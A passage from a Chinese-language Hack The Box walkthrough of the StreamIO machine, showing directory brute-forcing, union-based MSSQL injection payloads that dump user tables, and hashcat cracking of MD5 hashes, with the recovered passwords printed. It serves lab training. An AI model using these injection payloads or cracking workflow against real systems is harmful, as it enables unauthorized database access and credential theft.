class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># feroxbuster -u https://streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k</span></span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.10.1</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ https://streamio.htb</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt</span><br><span class="line"> 👌  Status Codes          │ All Status Codes!</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.10.1</span><br><span class="line"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> 🔎  Extract Links         │ <span class="literal">true</span></span><br><span class="line"> 💲  Extensions            │ [php]</span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔓  Insecure              │ <span class="literal">true</span></span><br><span class="line"> 🔃  Recursion Depth       │ 4</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">301      GET        2l       10w      151c https://streamio.htb/images =&gt; https://streamio.htb/images/</span><br><span class="line">301      GET        2l       10w      150c https://streamio.htb/admin =&gt; https://streamio.htb/admin/</span><br><span class="line">301      GET        2l       10w      147c https://streamio.htb/js =&gt; https://streamio.htb/js/</span><br><span class="line">301      GET        2l       10w      148c https://streamio.htb/css =&gt; https://streamio.htb/css/</span><br><span class="line">200      GET        2l     1276w    88145c https://streamio.htb/js/jquery-3.4.1.min.js</span><br><span class="line">200      GET      231l      571w     7825c https://streamio.htb/about.php</span><br><span class="line">200      GET      192l     1006w    82931c https://streamio.htb/images/icon.png</span><br><span class="line">200      GET      395l      915w    13497c https://streamio.htb/index.php</span><br><span class="line">200      GET      101l      173w     1663c https://streamio.htb/css/responsive.css</span><br><span class="line">200      GET      111l      269w     4145c https://streamio.htb/login.php</span><br><span class="line">200      GET        5l      374w    21257c https://streamio.htb/js/popper.min.js</span><br><span class="line">200      GET       51l      213w    19329c https://streamio.htb/images/client.jpg</span><br><span class="line">200      GET      863l     1698w    16966c https://streamio.htb/css/style.css</span><br><span class="line">200      GET      206l      430w     6434c https://streamio.htb/contact.php</span><br><span class="line">200      GET      913l     5479w   420833c https://streamio.htb/images/about-img.png</span><br><span class="line">302      GET        0l        0w        0c https://streamio.htb/logout.php =&gt; https://streamio.htb/</span><br><span class="line">200      GET      367l     1995w   166220c https://streamio.htb/images/contact-img.png</span><br><span class="line">200      GET      395l      915w    13497c https://streamio.htb/</span><br><span class="line">200      GET      121l      291w     4500c https://streamio.htb/register.php</span><br><span class="line">200      GET      191l      253w     3120c https://streamio.htb/css/login.css</span><br><span class="line">301      GET        2l       10w      157c https://streamio.htb/admin/images =&gt; https://streamio.htb/admin/images/</span><br><span class="line">301      GET        2l       10w      154c https://streamio.htb/admin/css =&gt; https://streamio.htb/admin/css/</span><br><span class="line">301      GET        2l       10w      153c https://streamio.htb/admin/js =&gt; https://streamio.htb/admin/js/</span><br><span class="line">200      GET      274l     1677w   150222c https://streamio.htb/images/barry.png</span><br><span class="line">200      GET     2059l    12754w  1028337c https://streamio.htb/images/samantha.png</span><br><span class="line">200      GET     1753l    10007w   871140c https://streamio.htb/images/oliver.png</span><br><span class="line">301      GET        2l       10w      150c https://streamio.htb/fonts =&gt; https://streamio.htb/fonts/</span><br><span class="line">403      GET        1l        1w       18c https://streamio.htb/admin/index.php</span><br><span class="line">301      GET        2l       10w      156c https://streamio.htb/admin/fonts =&gt; https://streamio.htb/admin/fonts/</span><br><span class="line">200      GET        2l        6w       58c https://streamio.htb/admin/master.php</span><br><span class="line">404      GET       40l      156w     1888c https://streamio.htb/con</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/admin/con</span><br><span class="line">404      GET       40l      156w     1895c https://streamio.htb/images/con</span><br><span class="line">404      GET       40l      156w     1891c https://streamio.htb/js/con</span><br><span class="line">404      GET       40l      156w     1892c https://streamio.htb/css/con</span><br><span class="line">404      GET       40l      156w     1901c https://streamio.htb/admin/images/con</span><br><span class="line">404      GET       40l      156w     1898c https://streamio.htb/admin/css/con</span><br><span class="line">404      GET       40l      156w     1897c https://streamio.htb/admin/js/con</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/fonts/con</span><br><span class="line">404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/con</span><br><span class="line">404      GET       40l      156w     1888c https://streamio.htb/aux</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/admin/aux</span><br><span class="line">404      GET       40l      156w     1895c https://streamio.htb/images/aux</span><br><span class="line">404      GET       40l      156w     1891c https://streamio.htb/js/aux</span><br><span class="line">404      GET       40l      156w     1892c https://streamio.htb/css/aux</span><br><span class="line">404      GET       40l      156w     1901c https://streamio.htb/admin/images/aux</span><br><span class="line">404      GET       40l      156w     1898c https://streamio.htb/admin/css/aux</span><br><span class="line">404      GET       40l      156w     1897c https://streamio.htb/admin/js/aux</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/fonts/aux</span><br><span class="line">404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/aux</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/images/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/js/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/css/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/images/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/css/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/js/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/images/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/css/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/js/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/images/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/css/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/js/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/fonts/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/fonts/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/fonts/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/fonts/error%1F_log.php</span><br><span class="line">404      GET       40l      156w     1888c https://streamio.htb/prn</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/admin/prn</span><br><span class="line">404      GET       40l      156w     1895c https://streamio.htb/images/prn</span><br><span class="line">404      GET       40l      156w     1891c https://streamio.htb/js/prn</span><br><span class="line">404      GET       40l      156w     1892c https://streamio.htb/css/prn</span><br><span class="line">404      GET       40l      156w     1901c https://streamio.htb/admin/images/prn</span><br><span class="line">404      GET       40l      156w     1898c https://streamio.htb/admin/css/prn</span><br><span class="line">404      GET       40l      156w     1897c https://streamio.htb/admin/js/prn</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/fonts/prn</span><br><span class="line">404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/prn</span><br><span class="line">[<span class="comment">####################] - 13m   265889/265889  0s      found:80      errors:1      </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/images/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/js/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/css/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/images/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/css/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/js/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/fonts/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/fonts/</span></span><br></pre></td></tr></table></figure>

<p>发现一个&#x2F;admin的目录，直接访问显示forbidden：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f03c458853aef53bfaa.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f03c458853aef53bfaa.jpg"></a></p>
<p>发现爆破结果中还有一个<a target="_blank" rel="noopener" href="https://streamio.htb/admin/master.php%EF%BC%8C%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%8B%EF%BC%9A">https://streamio.htb/admin/master.php，访问一下：</a></p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f0cc458853aef53cb7a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f0cc458853aef53cb7a.jpg"></a></p>
<p>提示我们只能通过包含来访问，因此我们可以推断某个地方应该是存在LFI的。这个域名的其余目录没什么收获，接下来爆破一下watch.streamio.htb这个二级域名的目录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$ feroxbuster -u https://watch.streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k</span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.10.1</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ https://watch.streamio.htb</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt</span><br><span class="line"> 👌  Status Codes          │ All Status Codes!</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.10.1</span><br><span class="line"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> 🔎  Extract Links         │ <span class="literal">true</span></span><br><span class="line"> 💲  Extensions            │ [php]</span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔓  Insecure              │ <span class="literal">true</span></span><br><span class="line"> 🔃  Recursion Depth       │ 4</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">200      GET      136l      295w    22042c https://watch.streamio.htb/static/logo.png</span><br><span class="line">200      GET      192l     1006w    82931c https://watch.streamio.htb/static/icon.png</span><br><span class="line">200      GET       72l      112w      875c https://watch.streamio.htb/static/css/index.css</span><br><span class="line">200      GET       78l      245w     2829c https://watch.streamio.htb/</span><br><span class="line">200      GET       25l       34w      247c https://watch.streamio.htb/static/css/search.css</span><br><span class="line">200      GET    10837l    20418w   195704c https://watch.streamio.htb/static/css/bootstrap.css</span><br><span class="line">200      GET     7193l    19558w   253905c https://watch.streamio.htb/search.php</span><br><span class="line">301      GET        2l       10w      161c https://watch.streamio.htb/static/css =&gt; https://watch.streamio.htb/static/css/</span><br><span class="line">403      GET       29l       92w     1233c https://watch.streamio.htb/static/</span><br><span class="line">301      GET        2l       10w      160c https://watch.streamio.htb/static/js =&gt; https://watch.streamio.htb/static/js/</span><br><span class="line">301      GET        2l       10w      157c https://watch.streamio.htb/static =&gt; https://watch.streamio.htb/static/</span><br><span class="line">403      GET       29l       92w     1233c https://watch.streamio.htb/static/css/</span><br><span class="line">200      GET       78l      245w     2829c https://watch.streamio.htb/index.php</span><br><span class="line">404      GET       40l      156w     1888c https://watch.streamio.htb/con</span><br><span class="line">404      GET       40l      156w     1895c https://watch.streamio.htb/static/con</span><br><span class="line">404      GET       40l      156w     1899c https://watch.streamio.htb/static/css/con</span><br><span class="line">404      GET       40l      156w     1898c https://watch.streamio.htb/static/js/con</span><br><span class="line">200      GET       20l       47w      677c https://watch.streamio.htb/blocked.php</span><br><span class="line">404      GET       40l      156w     1888c https://watch.streamio.htb/aux</span><br><span class="line">404      GET       40l      156w     1895c https://watch.streamio.htb/static/aux</span><br><span class="line">404      GET       40l      156w     1899c https://watch.streamio.htb/static/css/aux</span><br><span class="line">404      GET       40l      156w     1898c https://watch.streamio.htb/static/js/aux</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/css/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/css/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/js/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/js/error%1F_log.php</span><br><span class="line">404      GET       40l      156w     1888c https://watch.streamio.htb/prn</span><br><span class="line">404      GET       40l      156w     1895c https://watch.streamio.htb/static/prn</span><br><span class="line">404      GET       40l      156w     1899c https://watch.streamio.htb/static/css/prn</span><br><span class="line">404      GET       40l      156w     1898c https://watch.streamio.htb/static/js/prn</span><br><span class="line">[<span class="comment">####################] - 5m    106359/106359  0s      found:34      errors:1      </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/ </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/static/ </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/static/css/ </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/static/js/</span></span><br></pre></td></tr></table></figure>

<p>可以找到一个<a target="_blank" rel="noopener" href="https://watch.streamio.htb/search.php%E5%92%8Chttps://watch.streamio.htb/blocked.php%EF%BC%8C%E8%AE%BF%E9%97%AE/search.php%E4%B9%8B%E5%90%8E%E6%98%BE%E7%A4%BA%E7%9A%84%E6%98%AF%E4%B8%80%E4%B8%AA%E6%90%9C%E7%B4%A2%E7%95%8C%E9%9D%A2%EF%BC%8C%E4%B8%8D%E7%94%A8%E5%A4%9A%E8%AF%B4%EF%BC%8C%E5%A4%A7%E6%A6%82%E7%8E%87%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%9A">https://watch.streamio.htb/search.php和https://watch.streamio.htb/blocked.php，访问/search.php之后显示的是一个搜索界面，不用多说，大概率存在SQL注入的漏洞：</a></p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f16c458853aef53db73.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f16c458853aef53db73.jpg"></a></p>
<p>访问&#x2F;blocked.php，界面如下：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f22c458853aef53f10d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f22c458853aef53f10d.jpg"></a></p>
<p>提示的有可疑行为，会被block 5分钟。首先对&#x2F;search.php进行手工注入，传入<code>1&#39;  and 1=1-- -</code>和<code>1&#39;  and 1=2-- -</code>结果不同，传入<code>1&#39;  and 1=1-- -</code>和<code>1&#39;  and 2=2-- -</code>结果相同。很明显，存在盲注。之后传入<code>1&#39; and (select count(*) from sysobjects)&gt;0-- -</code>之后，页面回显正常，判断数据库为MSSQL。起初我发现xp_cmdshell是开启状态，想直接利用它执行命令，但是又发现我们的权限并不是sysadmin，所以没法利用，遂放弃。</p>
<p>因为禁用了order，所以我们使用<code>union select</code>来判断列数，通过在<code>union select</code>后不断添加字段数量，得到列数为6，回显点为2和3：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f3bc458853aef542183.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f3bc458853aef542183.jpg"></a></p>
<p>接着尝试得到数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#获取版本</span><br><span class="line">000&#x27; union select 1,(select @@version),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) </span><br><span class="line">	Sep 24 2019 13:48:23 </span><br><span class="line">	Copyright (C) 2019 Microsoft Corporation</span><br><span class="line">	Express Edition (64-bit) on Windows Server 2019 Standard 10.0 </span><br><span class="line"></span><br><span class="line">#获取当前数据库名</span><br><span class="line">000&#x27; union select 1,(select db_name()),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">STREAMIO</span><br><span class="line"></span><br><span class="line">#获取所有数据库名</span><br><span class="line">000&#x27; union select 1,(select name from master..sysdatabases for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">&lt;row&gt;&lt;name&gt;master&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;tempdb&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;model&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;msdb&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;STREAMIO&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;streamio_backup&lt;/name&gt;&lt;/row&gt;</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">000&#x27; union select 1,(select name from STREAMIO..sysobjects where xtype=&#x27;u&#x27; for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">&lt;row&gt;&lt;name&gt;movies&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;users&lt;/name&gt;&lt;/row&gt;</span><br><span class="line"></span><br><span class="line">#获取users表中的列名</span><br><span class="line">000&#x27; union select 1,(select name from STREAMIO..syscolumns where id=(select max(id) from STREAMIO..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;) for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">&lt;row&gt;&lt;name&gt;id&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;is_staff&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;password&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;username&lt;/name&gt;&lt;/row&gt;</span><br><span class="line"></span><br><span class="line">#获取username和password</span><br><span class="line">000&#x27; union select 1,(select username,password from STREAMIO..users for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">James c660060492d9edcaa8332d89c99c9239 Theodore 925e5408ecb67aea449373d668b7359e Samantha 083ffae904143c4796e464dac33c1f7d Lauren 08344b85b329d7efd611b7a7743e8a09 William d62be0dc82071bccc1322d64ec5b6c51 Sabrina f87d3c0d6c8fd686aacc6627f1f493a5 Robert f03b910e2bd0313a23fdd7575f34a694 Thane 3577c47eb1e12c8ba021611e1280753c Carmon 35394484d89fcfdb3c5e447fe749d213 Barry 54c88b2dbd7b1a84012fabc1a4c73415 Oliver fd78db29173a5cf701bd69027cb9bf6b Michelle b83439b16f844bd6ffe35c02fe21b3c0 Gloria 0cfaaaafb559f081df2befbe66686de0 Victoria b22abb47a02b52d5dfa27fb0b534f693 Alexendra 1c2b3d8270321140e5153f6637d3ee53 Baxter 22ee218331afd081b0dcd8115284bae3 Clara ef8f3d30a856cf166fb8215aca93e9ff Barbra 3961548825e3e21df5646cafe11c6c76 Lenord ee0b8a0937abd60c2882eacb2f8dc49f Austin 0049ac57646627b8d7aeaccf8b6a936f Garfield 8097cedd612cc37c29db152b6e9edbd3 Juliette 6dcd87740abb64edfa36d170f0d5450d Victor bf55e15b119860a6e6b5a164377da719 Lucifer 7df45a9e3de3863807c026ba48e55fb3 Bruno 2a4e2cf22dd8fcb45adcb91be1e22ae8 Diablo ec33265e5fc8c2f1b0c137bb7b3632b5 Robin dc332fb5576e9631c9dae83f194f8e70 Stan 384463526d288edcc95fc3701e523bc7 yoshihide b779ba15cedfd22a023c4d8bcf5f2332 admin 665a50ac9eaa781e4f7f04199db97a11</span><br></pre></td></tr></table></figure>

<p>得到了一批密码，使用hash-identifier检验之后，发现密码是使用md5算法生成。</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f47c458853aef5434e6.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f47c458853aef5434e6.jpg"></a></p>
<p>接下来尝试对这批密码进行解密，但是解密之前我们需要对我们的数据进行一些处理。比如将username都储存在一个文件里，然后password都储存在一个文件里，以及按照<code>username:password</code>的格式再生成一个文件。为此，我写了个小脚本来帮我完成这件事情：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;James c660060492d9edcaa8332d89c99c9239 Theodore 925e5408ecb67aea449373d668b7359e Samantha 083ffae904143c4796e464dac33c1f7d Lauren 08344b85b329d7efd611b7a7743e8a09 William d62be0dc82071bccc1322d64ec5b6c51 Sabrina f87d3c0d6c8fd686aacc6627f1f493a5 Robert f03b910e2bd0313a23fdd7575f34a694 Thane 3577c47eb1e12c8ba021611e1280753c Carmon 35394484d89fcfdb3c5e447fe749d213 Barry 54c88b2dbd7b1a84012fabc1a4c73415 Oliver fd78db29173a5cf701bd69027cb9bf6b Michelle b83439b16f844bd6ffe35c02fe21b3c0 Gloria 0cfaaaafb559f081df2befbe66686de0 Victoria b22abb47a02b52d5dfa27fb0b534f693 Alexendra 1c2b3d8270321140e5153f6637d3ee53 Baxter 22ee218331afd081b0dcd8115284bae3 Clara ef8f3d30a856cf166fb8215aca93e9ff Barbra 3961548825e3e21df5646cafe11c6c76 Lenord ee0b8a0937abd60c2882eacb2f8dc49f Austin 0049ac57646627b8d7aeaccf8b6a936f Garfield 8097cedd612cc37c29db152b6e9edbd3 Juliette 6dcd87740abb64edfa36d170f0d5450d Victor bf55e15b119860a6e6b5a164377da719 Lucifer 7df45a9e3de3863807c026ba48e55fb3 Bruno 2a4e2cf22dd8fcb45adcb91be1e22ae8 Diablo ec33265e5fc8c2f1b0c137bb7b3632b5 Robin dc332fb5576e9631c9dae83f194f8e70 Stan 384463526d288edcc95fc3701e523bc7 yoshihide b779ba15cedfd22a023c4d8bcf5f2332 admin 665a50ac9eaa781e4f7f04199db97a11&quot;</span></span><br><span class="line">a = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">f_user = <span class="built_in">open</span>(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">f_pass = <span class="built_in">open</span>(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">f_uap = <span class="built_in">open</span>(<span class="string">&quot;userpass&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        f_user.write(a[i] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f_uap.write(a[i] + <span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f_pass.write(a[i] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f_uap.write(a[i] + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f_uap.close()</span><br><span class="line">f_user.close()</span><br><span class="line">f_pass.close()</span><br></pre></td></tr></table></figure>

<p>接下来使用hashcat对密码进行破解：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># hashcat userpass /usr/share/wordlists/rockyou.txt --username -m 0 --show</span></span><br><span class="line">Lauren:08344b85b329d7efd611b7a7743e8a09:<span class="comment">##123a8j8w5123##</span></span><br><span class="line">Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$</span><br><span class="line">Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical</span><br><span class="line">Barry:54c88b2dbd7b1a84012fabc1a4c73415:<span class="variable">$hadoW</span></span><br><span class="line">Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123</span><br><span class="line">Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!</span><br><span class="line">Clara:ef8f3d30a856cf166fb8215aca93e9ff:%<span class="variable">$clara</span></span><br><span class="line">Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i</span><br><span class="line">Juliette:6dcd87740abb64edfa36d170f0d5450d:<span class="variable">$3xybitch</span></span><br><span class="line">Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$</span><br><span class="line">yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..</span><br><span class="line">admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd</span><br></pre></td></tr></table></figure>

<p>继续对该结果进行处理，将username都储存在一个文件里，将已破解的password都储存在一个文件里，以及按照<code>username:password</code>的格式再生成一个文件。</p>
